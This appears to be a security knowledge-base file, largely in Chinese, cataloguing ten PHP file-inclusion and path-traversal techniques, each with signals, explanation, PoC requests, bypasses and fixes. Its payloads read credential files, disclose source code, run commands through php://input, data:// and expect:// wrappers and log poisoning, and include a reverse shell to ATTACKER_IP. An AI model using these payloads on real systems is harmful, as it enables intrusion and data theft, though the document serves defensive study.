# File Inclusion & Path Traversal Techniques

> 所有条目格式遵循 `ENTRY_TEMPLATE.md`，前缀 `KB-FI`，来源限于 PortSwigger、OWASP WSTG、HackTricks、PayloadsAllTheThings、CWE。

---

### [KB-FI-001] Basic Path Traversal (../)
- **类别**: File Inclusion / Path Traversal
- **信号**: 应用程序在 `include()` / `file_get_contents()` / `fopen()` 等函数中使用用户可控的路径参数，且未做充分过滤。观察返回内容中是否出现预期外的文件内容（如 `/etc/passwd` 片段）。
- **原理**: 攻击者通过在文件路径参数中插入 `../` 序列逐级向上跳出 Web 根目录，访问服务器文件系统上的任意文件。操作系统在解析路径时处理 `..` 为父目录引用，若应用未过滤或规范化路径，攻击者可逃逸出沙箱。
- **最小PoC**:
  ```
  GET /page.php?file=../../../etc/passwd
  GET /download?filename=../../../etc/passwd
  ```
- **绕过与变体**:
  - 使用 `....//` 或 `..././` 绕过简单字符串替换过滤
  - Windows 下使用 `..\` 反斜杠
  - 使用 URL 编码 `%2e%2e%2f` → `../`
- **修复**: 白名单允许的路径前缀 / 文件名；`basename()` 剥离路径组件；`realpath()` 解析并比对白名单；使用 chroot/jail 限制文件系统访问范围。
- **参考**: CWE-22, PortSwigger: File path traversal, OWASP WSTG-ATHZ-001

---

### [KB-FI-002] Absolute Path Bypass
- **类别**: File Inclusion / Path Traversal
- **信号**: 应用仅过滤了 `../` 但未阻止绝对路径（如 `/etc/passwd`），或应用需要以特定前缀（如图片目录）开头但未检测第二个路径注入。
- **原理**: 当应用程序仅对相对路径遍历做防御但允许绝对路径时，攻击者可以直接提供操作系统完整路径来读写任意文件。某些情况下，应用拼接路径时在用户输入前加了固定目录前缀，但未阻止用户继续追加遍历序列或绝对路径覆盖。
- **最小PoC**:
  ```
  GET /page.php?file=/etc/passwd
  GET /page.php?file=C:\Windows\win.ini
  GET /img.php?path=/var/www/images/../../../etc/shadow
  ```
- **绕过与变体**: 在拼接场景中先写入合法前缀再追加 `../` 序列；Windows 下盘符遍历 `C:\`、`D:\`；使用 UNC 路径 `\\server\share\file`。
- **修复**: 禁止用户输入中包含 `/`、`\` 开头的绝对路径；强制路径白名单（仅允许预定义的 base 目录及其子目录）；使用 `realpath()` 并验证解析后的路径前缀。
- **参考**: CWE-22, OWASP Path Traversal, HackTricks: File Inclusion

---

### [KB-FI-003] Null Byte Injection
- **类别**: File Inclusion / Null Byte Bypass
- **信号**: 目标为 PHP ≤ 5.3.4 环境；应用程序在用户输入后追加固定扩展名（如 `.php`、`.html`）但底层 C 函数将 `\0` 视为字符串终止符。
- **原理**: PHP 的底层文件操作函数（如 `include()`、`fopen()`）通过 C 标准库实现，C 字符串以 null 字节 `\0` 结尾。攻击者在文件名末尾注入 `%00`，使得 C 层面在 null 字节处截断字符串，从而忽略应用追加的扩展名，包含任意文件。
- **最小PoC**:
  ```
  GET /page.php?file=../../../etc/passwd%00
  GET /page.php?language=../../../etc/passwd%00.html
  ```
  服务器拼接 `$file = $_GET['language'] . '.php'` 后，C 层读到 `../../../etc/passwd\0.php`，在 `\0` 处停止。
- **绕过与变体**: Null byte 仅对 PHP < 5.3.4 有效（更高版本已修复）；可与路径遍历组合使用；其他语言中尝试类似手法取决于底层 C 调用链。
- **修复**: 升级 PHP ≥ 5.3.4；使用 `basename()` 剥离路径/扩展名后验证；白名单文件标识符而非文件路径。
- **参考**: CWE-158, PortSwigger: File path traversal, HackTricks: File Inclusion

---

### [KB-FI-004] Double URL Encoding
- **类别**: File Inclusion / Encoding Bypass
- **信号**: 应用对用户输入做了一次 URL 解码后过滤 `../`，但 Web 服务器或中间件可能进行第二次 URL 解码，导致过滤被绕过。
- **原理**: 攻击者对路径遍历序列做双重 URL 编码。例如 `../` → `%2e%2e%2f` → `%252e%252e%252f`。应用程序在过滤阶段只做一次解码，看到的是 `%2e%2e%2f`（不含字面 `../`），放行后 Web 服务器/框架再解码一次，还原为 `../` 执行遍历。
- **最小PoC**:
  ```
  GET /page.php?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
  GET /image?filename=%252e%252e%252f%252e%252e%252fetc%252fpasswd
  ```
- **绕过与变体**:
  - 三重/四重编码（取决于解码次数）
  - 混合编码：部分字符单次编码、部分双重编码
  - 结合 Unicode 编码变体 `..%c0%af` 或 `..%c1%9c`
- **修复**: 在规范化（normalization）之后做安全判断，而非在原始输入阶段；URL 解码只执行一次，由单一组件负责；使用路径 API（`realpath()`）验证而非字符串过滤。
- **参考**: CWE-22, CWE-180, PortSwigger: File path traversal, OWASP: Double Encoding

---

### [KB-FI-005] PHP Wrapper — php://filter
- **类别**: File Inclusion / PHP Wrapper
- **信号**: 目标存在 LFI 且 `allow_url_include` 可能为 Off，但 `php://filter` 无需远程包含。LFI 点可读取 PHP 源码但渲染后不显示内容（PHP 源码被解析执行）。
- **原理**: `php://filter` 流包装器允许在读取文件时对其内容进行 Base64 编码或其他转换。攻击者通过此包装器读取 PHP 文件时，内容被 Base64 编码后输出，而非被 PHP 解释器执行，从而以明文形式泄露服务器端源代码。
- **最小PoC**:
  ```
  GET /page.php?file=php://filter/convert.base64-encode/resource=index.php
  GET /page.php?file=php://filter/read=convert.base64-encode/resource=../config.php
  ```
  输出为 Base64 编码的 PHP 源码，解码后获得敏感信息（数据库凭证、逻辑等）。
- **绕过与变体**:
  - 多次编码链：`php://filter/convert.base64-encode|convert.base64-encode/resource=file`（解码两次）
  - 使用 `convert.iconv.utf-8.utf-16` 等其他转换器
  - 结合路径遍历：`php://filter/convert.base64-encode/resource=../../../etc/passwd`
- **修复**: 禁用不必要的 PHP 流包装器（`allow_url_fopen=Off`，并在 `disable_functions` 或代码层面白名单允许的文件路径）；不将用户输入直接传给 `include/require`。
- **参考**: CWE-98, PortSwigger: Server-side template injection / File inclusion, HackTricks: LFI via php://filter

---

### [KB-FI-006] PHP Wrapper — php://input (LFI to RCE)
- **类别**: File Inclusion / PHP Wrapper → RCE
- **信号**: LFI 漏洞存在且 `allow_url_include=On`（PHP 配置）；攻击者可在 POST body 中注入任意 PHP 代码并被 `include()` 执行。
- **原理**: `php://input` 是一个只读流，可访问原始 HTTP 请求体。当 `allow_url_include=On` 时，攻击者将恶意 PHP 代码放在 POST 请求体中，通过 LFI 点以 `php://input` 包含，代码即在服务器上执行，实现远程代码执行。
- **最小PoC**:
  ```http
  POST /page.php?file=php://input HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  <?php system('id'); ?>
  ```
  服务器执行 `id` 命令并返回输出。
- **绕过与变体**:
  - 使用 `<?=system('id')?>` 短标签
  - 结合 Base64 解码：`php://filter/convert.base64-decode/resource=php://input`，POST body 放 Base64 编码的 PHP 代码
  - 若 `allow_url_include=Off`，此手法无效，需换用 log poisoning 等其他 LFI → RCE 链路
- **修复**: 设置 `allow_url_include=Off`（PHP 默认）；禁止用户输入流进 `include/require`；使用白名单文件名映射。
- **参考**: CWE-98, HackTricks: LFI to RCE via php://input, PayloadsAllTheThings: PHP Wrapper

---

### [KB-FI-007] data:// Wrapper
- **类别**: File Inclusion / PHP Wrapper → RCE
- **信号**: LFI 存在且 `allow_url_include=On` 且 `allow_url_fopen=On`；`data://` 包装器可将内联数据直接当作文件包含。
- **原理**: `data://` 包装器允许在 URL 中嵌入 MIME 类型和原始数据。攻击者构造 `data://text/plain,<?php system('id');?>` 或 Base64 版本，通过 LFI 点包含后即执行嵌入的 PHP 代码。
- **最小PoC**:
  ```
  GET /page.php?file=data://text/plain,<?php system('id');?>
  GET /page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
  ```
- **绕过与变体**:
  - 使用 Base64 编码避免特殊字符截断问题
  - 使用 `data://text/html,` 或 `data://application/octet-stream,` 等不同 MIME
  - 结合 `php://filter` 解码链：`php://filter/convert.base64-decode/resource=data://...`
- **修复**: `allow_url_include=Off`；`allow_url_fopen=Off` 阻断 `data://`；白名单文件名；不将用户输入传给 `include/require`。
- **参考**: CWE-98, HackTricks: LFI via data:// wrapper, PayloadsAllTheThings: PHP data://

---

### [KB-FI-008] expect:// Wrapper
- **类别**: File Inclusion / PHP Wrapper → RCE
- **信号**: PHP 安装了 `expect` 扩展（非默认，需 `--with-expect` 编译，常见于某些容器/开发环境）；LFI 点存在。
- **原理**: `expect://` 包装器通过 PTY 连接到系统 shell 并执行命令。当 LFI 点允许包含 `expect://command` 时，PHP 会通过 `expect` 扩展执行指定的系统命令并返回输出，实现远程代码执行。
- **最小PoC**:
  ```
  GET /page.php?file=expect://id
  GET /page.php?file=expect://whoami
  GET /page.php?file=expect://cat /etc/passwd
  ```
- **绕过与变体**:
  - 管道命令：`expect://ls -la | grep secret`
  - 反向 shell：`expect://bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'`
- **修复**: 不在生产环境安装/启用 `expect` 扩展；`allow_url_include=Off`；白名单文件名映射。
- **参考**: CWE-98, HackTricks: LFI via expect://, PayloadsAllTheThings: PHP Wrapper

---

### [KB-FI-009] LFI to RCE via Log Poisoning
- **类别**: File Inclusion / LFI → RCE
- **信号**: LFI 存在且可读取 Web 服务器访问日志（如 `/var/log/apache2/access.log`、`/var/log/nginx/access.log`）；User-Agent 或其他请求头出现在日志中未被净化。
- **原理**: 攻击者在 HTTP 请求头（如 User-Agent）中植入 PHP 代码（`<?php system('id');?>`），此代码随请求被记录到 Web 服务器访问日志中。然后通过 LFI 包含该日志文件，日志中的 PHP 代码被解析执行，实现 RCE。类似手法也可针对 SSH 认证日志、邮件日志等。
- **最小PoC**:
  ```http
  GET / HTTP/1.1
  User-Agent: <?php system('id');?>
  ```
  然后：
  ```
  GET /page.php?file=/var/log/apache2/access.log
  GET /page.php?file=../../../var/log/nginx/access.log
  ```
  输出中可见 `id` 命令执行结果。
- **绕过与变体**:
  - 污染 SSH 日志 `/var/log/auth.log`：`ssh "<?php system('id');?>"@target`
  - 污染邮件日志 `/var/log/mail.log`
  - 污染 FTP 日志 `/var/log/vsftpd.log`
  - 若日志文件过大导致执行超时，先用 `php://filter` 压缩/截取或污染特定请求行
  - Windows 下日志路径：`C:\xampp\apache\logs\access.log` 等
- **修复**: 限制 `include/require` 的文件范围（白名单）；减少日志中写入未净化的请求头（或对日志做输出编码）；定期轮转日志并限制日志文件的读取权限；`open_basedir` 限制 PHP 可访问的文件路径。
- **参考**: CWE-98, HackTricks: LFI via log poisoning, PayloadsAllTheThings: LFI to RCE

---

### [KB-FI-010] LFI to RCE via /proc/self/environ
- **类别**: File Inclusion / LFI → RCE
- **信号**: Linux 系统 + Apache（或其他以 CGI/FastCGI 方式运行 PHP 的环境）+ LFI 读取 `/proc/self/environ` 可访问；User-Agent 或其他 HTTP 头被写入进程环境变量。
- **原理**: 在 Linux 上，`/proc/self/environ` 文件包含当前进程的环境变量。当 PHP 以 CGI 模式运行在 Apache 上时，HTTP 请求头（如 User-Agent）会被写入环境变量（形如 `HTTP_USER_AGENT`）。攻击者在 User-Agent 中注入 PHP 代码，然后通过 LFI 包含 `/proc/self/environ`，环境变量中的 PHP 恶意代码被执行。
- **最小PoC**:
  ```http
  GET /page.php?file=/proc/self/environ HTTP/1.1
  User-Agent: <?php system('id');?>
  ```
  响应中 `/proc/self/environ` 的 null-byte 分隔的环境变量内容被包含，PHP 代码在 `HTTP_USER_AGENT=...` 处被解析执行。
- **绕过与变体**:
  - 使用 `../../../proc/self/environ` 路径遍历到达
  - 也可尝试 `/proc/self/fd/N`（N 为文件描述符编号，指向访问日志等）
  - `/proc/self/cmdline` 获取进程命令行参数
  - 需要 PHP 运行在 CGI/FastCGI 模式下且进程环境可读
- **修复**: 不在 CGI 模式下运行 PHP（使用 PHP-FPM 或 mod_php 替代 `mod_cgi`）；限制 `open_basedir` 排除 `/proc`；不将用户输入直接传给 `include/require`；使用白名单文件访问策略。
- **参考**: CWE-98, HackTricks: LFI via /proc/self/environ, PayloadsAllTheThings: LFI to RCE
